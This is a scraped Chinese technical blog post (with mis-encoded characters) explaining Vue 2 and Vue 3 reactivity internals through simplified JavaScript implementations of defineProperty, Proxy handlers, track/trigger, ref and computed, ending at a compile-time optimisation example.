content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Vue å“åº”å¼åŸç†æ·±åº¦è§£æ
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2771198801097485/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    æ»¡å¤©æ˜Ÿè¾°
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-08T08:57:35.000Z" title="Thu Jan 08 2026 08:57:35 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    9
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»7åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">ğŸ—ï¸Â <strong>æ ¸å¿ƒæ¶æ„æ¦‚è§ˆ</strong></h2>
<h3 data-id="heading-1">1.Â <strong>å“åº”å¼ç³»ç»Ÿä¸‰å±‚æ¶æ„</strong></h3>
<pre><code class="hljs language-text" lang="text">â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚           ç»„ä»¶æ¸²æŸ“ç³»ç»Ÿ (Renderer)        â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚         å“åº”å¼ç³»ç»Ÿ (Reactivity)          â”‚
â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”  â”‚
â”‚  â”‚  ä¾èµ–æ”¶é›†    â”‚  â”‚  è§¦å‘æ›´æ–°         â”‚  â”‚
â”‚  â”‚  (Track)    â”‚  â”‚  (Trigger)       â”‚  â”‚
â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜  â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚       åŸå§‹å“åº”å¼å¯¹è±¡ (Raw Objects)       â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
</code></pre>
<h2 data-id="heading-2">ğŸ”„Â <strong>Vue 2 vs Vue 3 å“åº”å¼åŸç†å¯¹æ¯”</strong></h2>
<h3 data-id="heading-3">2.Â <strong>Vue 2: Object.defineProperty</strong></h3>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// Vue 2 å“åº”å¼å®ç°ç®€åŒ–ç‰ˆ</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">defineReactive</span>(<span class="hljs-params">obj, key, val</span>) {
  <span class="hljs-comment">// ä¸ºæ¯ä¸ªå±æ€§åˆ›å»º Depï¼ˆä¾èµ–æ”¶é›†å™¨ï¼‰</span>
  <span class="hljs-keyword">const</span> dep = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Dep</span>()
  
  <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">defineProperty</span>(obj, key, {
    <span class="hljs-attr">enumerable</span>: <span class="hljs-literal">true</span>,
    <span class="hljs-attr">configurable</span>: <span class="hljs-literal">true</span>,
    <span class="hljs-title function_">get</span>(<span class="hljs-params"/>) {
      <span class="hljs-comment">// ä¾èµ–æ”¶é›†</span>
      <span class="hljs-keyword">if</span> (<span class="hljs-title class_">Dep</span>.<span class="hljs-property">target</span>) {
        dep.<span class="hljs-title function_">depend</span>()  <span class="hljs-comment">// æ”¶é›†å½“å‰ watcher</span>
      }
      <span class="hljs-keyword">return</span> val
    },
    <span class="hljs-title function_">set</span>(<span class="hljs-params">newVal</span>) {
      <span class="hljs-keyword">if</span> (newVal === val) <span class="hljs-keyword">return</span>
      val = newVal
      <span class="hljs-comment">// è§¦å‘æ›´æ–°</span>
      dep.<span class="hljs-title function_">notify</span>()
    }
  })
}

<span class="hljs-comment">// é€’å½’å¯¹è±¡å®ç°æ·±åº¦å“åº”å¼</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">observe</span>(<span class="hljs-params">obj</span>) {
  <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> obj !== <span class="hljs-string">'object'</span> || obj === <span class="hljs-literal">null</span>) {
    <span class="hljs-keyword">return</span>
  }
  
  <span class="hljs-comment">// é€’å½’å¤„ç†å¯¹è±¡å±æ€§</span>
  <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">keys</span>(obj).<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">key</span> =&gt;</span> {
    <span class="hljs-title function_">defineReactive</span>(obj, key, obj[key])
  })
}

<span class="hljs-comment">// Vue 2 çš„å±€é™æ€§ï¼š</span>
<span class="hljs-comment">// 1. æ— æ³•æ£€æµ‹å¯¹è±¡å±æ€§çš„æ·»åŠ /åˆ é™¤</span>
<span class="hljs-comment">// 2. æ•°ç»„å˜å¼‚æ–¹æ³•éœ€è¦ç‰¹æ®Šå¤„ç†</span>
<span class="hljs-comment">// 3. æ€§èƒ½é—®é¢˜ï¼šé€’å½’éå†æ‰€æœ‰å±æ€§</span>
</code></pre>
<h3 data-id="heading-4">3.Â <strong>Vue 3: Proxy + Reflect</strong></h3>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// Vue 3 å“åº”å¼å®ç°ç®€åŒ–ç‰ˆ</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">reactive</span>(<span class="hljs-params">target</span>) {
  <span class="hljs-keyword">return</span> <span class="hljs-title function_">createReactiveObject</span>(target)
}

<span class="hljs-keyword">function</span> <span class="hljs-title function_">createReactiveObject</span>(<span class="hljs-params">target</span>) {
  <span class="hljs-comment">// åˆ›å»ºå“åº”å¼å¤„ç†å™¨</span>
  <span class="hljs-keyword">const</span> handler = {
    <span class="hljs-title function_">get</span>(<span class="hljs-params">target, key, receiver</span>) {
      <span class="hljs-keyword">const</span> result = <span class="hljs-title class_">Reflect</span>.<span class="hljs-title function_">get</span>(target, key, receiver)
      <span class="hljs-comment">// ä¾èµ–æ”¶é›†</span>
      <span class="hljs-title function_">track</span>(target, key)
      <span class="hljs-comment">// æ·±åº¦å“åº”å¼ï¼šå¦‚æœå€¼æ˜¯å¯¹è±¡ï¼Œé€’å½’å¤„ç†</span>
      <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> result === <span class="hljs-string">'object'</span> &amp;&amp; result !== <span class="hljs-literal">null</span>) {
        <span class="hljs-keyword">return</span> <span class="hljs-title function_">reactive</span>(result)
      }
      <span class="hljs-keyword">return</span> result
    },
    
    <span class="hljs-title function_">set</span>(<span class="hljs-params">target, key, value, receiver</span>) {
      <span class="hljs-keyword">const</span> oldValue = target[key]
      <span class="hljs-keyword">const</span> result = <span class="hljs-title class_">Reflect</span>.<span class="hljs-title function_">set</span>(target, key, value, receiver)
      
      <span class="hljs-comment">// åªæœ‰å€¼å˜åŒ–æ—¶æ‰è§¦å‘æ›´æ–°</span>
      <span class="hljs-keyword">if</span> (oldValue !== value) {
        <span class="hljs-comment">// è§¦å‘æ›´æ–°</span>
        <span class="hljs-title function_">trigger</span>(target, key)
      }
      <span class="hljs-keyword">return</span> result
    },
    
    <span class="hljs-title function_">deleteProperty</span>(<span class="hljs-params">target, key</span>) {
      <span class="hljs-keyword">const</span> hasKey = <span class="hljs-title function_">hasOwn</span>(target, key)
      <span class="hljs-keyword">const</span> result = <span class="hljs-title class_">Reflect</span>.<span class="hljs-title function_">deleteProperty</span>(target, key)
      
      <span class="hljs-keyword">if</span> (hasKey &amp;&amp; result) {
        <span class="hljs-comment">// è§¦å‘æ›´æ–°</span>
        <span class="hljs-title function_">trigger</span>(target, key)
      }
      <span class="hljs-keyword">return</span> result
    },
    
    <span class="hljs-title function_">has</span>(<span class="hljs-params">target, key</span>) {
      <span class="hljs-keyword">const</span> result = <span class="hljs-title class_">Reflect</span>.<span class="hljs-title function_">has</span>(target, key)
      <span class="hljs-title function_">track</span>(target, key)
      <span class="hljs-keyword">return</span> result
    },
    
    <span class="hljs-title function_">ownKeys</span>(<span class="hljs-params">target</span>) {
      <span class="hljs-title function_">track</span>(target, <span class="hljs-variable constant_">ITERATE_KEY</span>)  <span class="hljs-comment">// è¿½è¸ªè¿­ä»£æ“ä½œ</span>
      <span class="hljs-keyword">return</span> <span class="hljs-title class_">Reflect</span>.<span class="hljs-title function_">ownKeys</span>(target)
    }
  }
  
  <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Proxy</span>(target, handler)
}

<span class="hljs-comment">// Vue 3 çš„ä¼˜åŠ¿ï¼š</span>
<span class="hljs-comment">// 1. æ”¯æŒå¯¹è±¡å±æ€§çš„æ·»åŠ /åˆ é™¤</span>
<span class="hljs-comment">// 2. æ›´å¥½çš„æ€§èƒ½ï¼ˆæƒ°æ€§ä»£ç†ï¼‰</span>
<span class="hljs-comment">// 3. æ”¯æŒ Mapã€Set ç­‰é›†åˆç±»å‹</span>
<span class="hljs-comment">// 4. æ›´ç²¾ç»†çš„ä¾èµ–è¿½è¸ª</span>
</code></pre>
<h2 data-id="heading-5">ğŸ¯Â <strong>æ ¸å¿ƒæ¦‚å¿µè¯¦è§£</strong></h2>
<h3 data-id="heading-6">4.Â <strong>ä¾èµ–æ”¶é›† (Track)</strong></h3>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// å…¨å±€çš„ä¾èµ–æ”¶é›†æ ˆ</span>
<span class="hljs-keyword">let</span> activeEffect = <span class="hljs-literal">null</span>
<span class="hljs-keyword">const</span> targetMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">WeakMap</span>()  <span class="hljs-comment">// ç›®æ ‡å¯¹è±¡ â†’ é”® â†’ ä¾èµ–é›†åˆ</span>

<span class="hljs-keyword">function</span> <span class="hljs-title function_">track</span>(<span class="hljs-params">target, key</span>) {
  <span class="hljs-keyword">if</span> (!activeEffect) <span class="hljs-keyword">return</span>
  
  <span class="hljs-comment">// è·å–ç›®æ ‡å¯¹è±¡çš„ä¾èµ–æ˜ å°„</span>
  <span class="hljs-keyword">let</span> depsMap = targetMap.<span class="hljs-title function_">get</span>(target)
  <span class="hljs-keyword">if</span> (!depsMap) {
    targetMap.<span class="hljs-title function_">set</span>(target, (depsMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Map</span>()))
  }
  
  <span class="hljs-comment">// è·å–å±æ€§çš„ä¾èµ–é›†åˆ</span>
  <span class="hljs-keyword">let</span> dep = depsMap.<span class="hljs-title function_">get</span>(key)
  <span class="hljs-keyword">if</span> (!dep) {
    depsMap.<span class="hljs-title function_">set</span>(key, (dep = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Set</span>()))
  }
  
  <span class="hljs-comment">// æ”¶é›†å½“å‰ effect</span>
  dep.<span class="hljs-title function_">add</span>(activeEffect)
  activeEffect.<span class="hljs-property">deps</span>.<span class="hljs-title function_">push</span>(dep)  <span class="hljs-comment">// åå‘è®°å½•ï¼Œç”¨äºæ¸…ç†</span>
}

<span class="hljs-comment">// Effect ç±»ï¼ˆç›¸å½“äº Vue 2 çš„ Watcherï¼‰</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">ReactiveEffect</span> {
  <span class="hljs-title function_">constructor</span>(<span class="hljs-params">fn, scheduler</span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">fn</span> = fn
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">scheduler</span> = scheduler
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">deps</span> = []  <span class="hljs-comment">// ä¾èµ–æ­¤ effect çš„æ‰€æœ‰ dep</span>
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">active</span> = <span class="hljs-literal">true</span>
  }
  
  <span class="hljs-title function_">run</span>(<span class="hljs-params"/>) {
    <span class="hljs-keyword">if</span> (!<span class="hljs-variable language_">this</span>.<span class="hljs-property">active</span>) <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">fn</span>()
    
    <span class="hljs-comment">// ä¿å­˜å½“å‰ effectï¼Œå¼€å§‹ä¾èµ–æ”¶é›†</span>
    <span class="hljs-keyword">const</span> lastEffect = activeEffect
    activeEffect = <span class="hljs-variable language_">this</span>
    <span class="hljs-keyword">try</span> {
      <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">fn</span>()
    } <span class="hljs-keyword">finally</span> {
      <span class="hljs-comment">// æ¢å¤ä¹‹å‰çš„ effect</span>
      activeEffect = lastEffect
    }
  }
  
  <span class="hljs-title function_">stop</span>(<span class="hljs-params"/>) {
    <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">active</span>) {
      <span class="hljs-comment">// æ¸…ç†æ‰€æœ‰ä¾èµ–</span>
      <span class="hljs-title function_">cleanupEffect</span>(<span class="hljs-variable language_">this</span>)
      <span class="hljs-variable language_">this</span>.<span class="hljs-property">active</span> = <span class="hljs-literal">false</span>
    }
  }
}

<span class="hljs-keyword">function</span> <span class="hljs-title function_">cleanupEffect</span>(<span class="hljs-params">effect</span>) {
  <span class="hljs-keyword">const</span> { deps } = effect
  deps.<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">dep</span> =&gt;</span> {
    dep.<span class="hljs-title function_">delete</span>(effect)
  })
  deps.<span class="hljs-property">length</span> = <span class="hljs-number">0</span>
}
</code></pre>
<h3 data-id="heading-7">5.Â <strong>è§¦å‘æ›´æ–° (Trigger)</strong></h3>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">trigger</span>(<span class="hljs-params">target, key, type = <span class="hljs-string">'SET'</span></span>) {
  <span class="hljs-keyword">const</span> depsMap = targetMap.<span class="hljs-title function_">get</span>(target)
  <span class="hljs-keyword">if</span> (!depsMap) <span class="hljs-keyword">return</span>
  
  <span class="hljs-comment">// è·å–è¯¥å±æ€§çš„ä¾èµ– effects</span>
  <span class="hljs-keyword">const</span> effects = depsMap.<span class="hljs-title function_">get</span>(key)
  
  <span class="hljs-comment">// è·å–è¿­ä»£æ“ä½œçš„ä¾èµ–ï¼ˆç”¨äº for...in, Object.keys ç­‰ï¼‰</span>
  <span class="hljs-keyword">const</span> iterateEffects = depsMap.<span class="hljs-title function_">get</span>(<span class="hljs-variable constant_">ITERATE_KEY</span>)
  
  <span class="hljs-keyword">const</span> effectsToRun = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Set</span>()
  
  <span class="hljs-comment">// æ”¶é›†éœ€è¦æ‰§è¡Œçš„ effects</span>
  <span class="hljs-keyword">if</span> (effects) {
    effects.<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">effect</span> =&gt;</span> {
      <span class="hljs-keyword">if</span> (effect !== activeEffect) {
        effectsToRun.<span class="hljs-title function_">add</span>(effect)
      }
    })
  }
  
  <span class="hljs-comment">// å¯¹äºæ·»åŠ /åˆ é™¤å±æ€§ï¼Œéœ€è¦è§¦å‘è¿­ä»£ä¾èµ–</span>
  <span class="hljs-keyword">if</span> (type === <span class="hljs-string">'ADD'</span> || type === <span class="hljs-string">'DELETE'</span>) {
    <span class="hljs-keyword">if</span> (iterateEffects) {
      iterateEffects.<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">effect</span> =&gt;</span> {
        <span class="hljs-keyword">if</span> (effect !== activeEffect) {
          effectsToRun.<span class="hljs-title function_">add</span>(effect)
        }
      })
    }
  }
  
  <span class="hljs-comment">// æ‰§è¡Œ effects</span>
  effectsToRun.<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">effect</span> =&gt;</span> {
    <span class="hljs-keyword">if</span> (effect.<span class="hljs-property">scheduler</span>) {
      effect.<span class="hljs-title function_">scheduler</span>()  <span class="hljs-comment">// è°ƒåº¦æ‰§è¡Œï¼ˆç”¨äº computedã€watchï¼‰</span>
    } <span class="hljs-keyword">else</span> {
      effect.<span class="hljs-title function_">run</span>()  <span class="hljs-comment">// ç«‹å³æ‰§è¡Œ</span>
    }
  })
}
</code></pre>
<h2 data-id="heading-8">âš¡Â <strong>å“åº”å¼ API å®ç°</strong></h2>
<h3 data-id="heading-9">6.Â <strong>ref å®ç°åŸç†</strong></h3>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">class</span> <span class="hljs-title class_">RefImpl</span> {
  <span class="hljs-title function_">constructor</span>(<span class="hljs-params">value, shallow = <span class="hljs-literal">false</span></span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">_value</span> = shallow ? value : <span class="hljs-title function_">toReactive</span>(value)
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">_rawValue</span> = value
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">__v_isRef</span> = <span class="hljs-literal">true</span>
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">_shallow</span> = shallow
    
    <span class="hljs-comment">// ä¸º ref åˆ›å»ºä¾èµ–é›†åˆ</span>
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">dep</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Set</span>()
  }
  
  <span class="hljs-keyword">get</span> <span class="hljs-title function_">value</span>() {
    <span class="hljs-comment">// ä¾èµ–æ”¶é›†</span>
    <span class="hljs-title function_">trackRefValue</span>(<span class="hljs-variable language_">this</span>)
    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">_value</span>
  }
  
  <span class="hljs-keyword">set</span> <span class="hljs-title function_">value</span>(<span class="hljs-params">newVal</span>) {
    <span class="hljs-keyword">if</span> (<span class="hljs-title function_">hasChanged</span>(newVal, <span class="hljs-variable language_">this</span>.<span class="hljs-property">_rawValue</span>)) {
      <span class="hljs-variable language_">this</span>.<span class="hljs-property">_rawValue</span> = newVal
      <span class="hljs-variable language_">this</span>.<span class="hljs-property">_value</span> = <span class="hljs-variable language_">this</span>.<span class="hljs-property">_shallow</span> ? newVal : <span class="hljs-title function_">toReactive</span>(newVal)
      <span class="hljs-comment">// è§¦å‘æ›´æ–°</span>
      <span class="hljs-title function_">triggerRefValue</span>(<span class="hljs-variable language_">this</span>)
    }
  }
}

<span class="hljs-keyword">function</span> <span class="hljs-title function_">trackRefValue</span>(<span class="hljs-params">ref</span>) {
  <span class="hljs-keyword">if</span> (activeEffect) {
    ref.<span class="hljs-property">dep</span>.<span class="hljs-title function_">add</span>(activeEffect)
    activeEffect.<span class="hljs-property">deps</span>.<span class="hljs-title function_">push</span>(ref.<span class="hljs-property">dep</span>)
  }
}

<span class="hljs-keyword">function</span> <span class="hljs-title function_">triggerRefValue</span>(<span class="hljs-params">ref</span>) {
  <span class="hljs-keyword">const</span> effects = ref.<span class="hljs-property">dep</span>
  effects.<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">effect</span> =&gt;</span> {
    <span class="hljs-keyword">if</span> (effect.<span class="hljs-property">scheduler</span>) {
      effect.<span class="hljs-title function_">scheduler</span>()
    } <span class="hljs-keyword">else</span> {
      effect.<span class="hljs-title function_">run</span>()
    }
  })
}

<span class="hljs-keyword">function</span> <span class="hljs-title function_">toReactive</span>(<span class="hljs-params">value</span>) {
  <span class="hljs-keyword">return</span> <span class="hljs-title function_">isObject</span>(value) ? <span class="hljs-title function_">reactive</span>(value) : value
}
</code></pre>
<h3 data-id="heading-10">7.Â <strong>computed å®ç°åŸç†</strong></h3>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">class</span> <span class="hljs-title class_">ComputedRefImpl</span> {
  <span class="hljs-title function_">constructor</span>(<span class="hljs-params">getter, setter</span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">_getter</span> = getter
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">_setter</span> = setter
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">_value</span> = <span class="hljs-literal">undefined</span>
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">_dirty</span> = <span class="hljs-literal">true</span>  <span class="hljs-comment">// è„æ£€æŸ¥æ ‡å¿—</span>
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">dep</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Set</span>()
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">effect</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ReactiveEffect</span>(
      getter,
      <span class="hljs-function">() =&gt;</span> {
        <span class="hljs-comment">// å½“ä¾èµ–å˜åŒ–æ—¶ï¼Œæ ‡è®°ä¸ºè„</span>
        <span class="hljs-keyword">if</span> (!<span class="hljs-variable language_">this</span>.<span class="hljs-property">_dirty</span>) {
          <span class="hljs-variable language_">this</span>.<span class="hljs-property">_dirty</span> = <span class="hljs-literal">true</span>
          <span class="hljs-comment">// è§¦å‘ä¾èµ– computed çš„ effects</span>
          <span class="hljs-title function_">triggerRefValue</span>(<span class="hljs-variable language_">this</span>)
        }
      }
    )
  }
  
  <span class="hljs-keyword">get</span> <span class="hljs-title function_">value</span>() {
    <span class="hljs-comment">// ä¾èµ–æ”¶é›†</span>
    <span class="hljs-title function_">trackRefValue</span>(<span class="hljs-variable language_">this</span>)
    
    <span class="hljs-comment">// å¦‚æœè„äº†ï¼Œé‡æ–°è®¡ç®—</span>
    <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">_dirty</span>) {
      <span class="hljs-variable language_">this</span>.<span class="hljs-property">_dirty</span> = <span class="hljs-literal">false</span>
      <span class="hljs-variable language_">this</span>.<span class="hljs-property">_value</span> = <span class="hljs-variable language_">this</span>.<span class="hljs-property">effect</span>.<span class="hljs-title function_">run</span>()
    }
    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">_value</span>
  }
  
  <span class="hljs-keyword">set</span> <span class="hljs-title function_">value</span>(<span class="hljs-params">newVal</span>) {
    <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">_setter</span>) {
      <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">_setter</span>(newVal)
    } <span class="hljs-keyword">else</span> {
      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">warn</span>(<span class="hljs-string">'Write operation failed: computed value is readonly'</span>)
    }
  }
}
</code></pre>
<h2 data-id="heading-11">ğŸ”§Â <strong>ç¼–è¯‘æ—¶ä¼˜åŒ–</strong></h2>
<h3 data-id="heading-12">8.Â <strong>Patch Flags ä¼˜åŒ–</strong></h3>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// æ¨¡æ¿ç¼–è¯‘ä¼˜åŒ–ç¤ºä¾‹</span>
<span class="hljs-comment">// ç¼–è¯‘å‰æ¨¡æ¿</span>
&lt;template&gt;
  <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">span</span>&gt;</span>é™æ€å†…å®¹<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">span</span>&gt;</span>{{ dynamic }}<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">:class</span>=<span class="hljs-string">"className"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>
&lt;/template&gt;

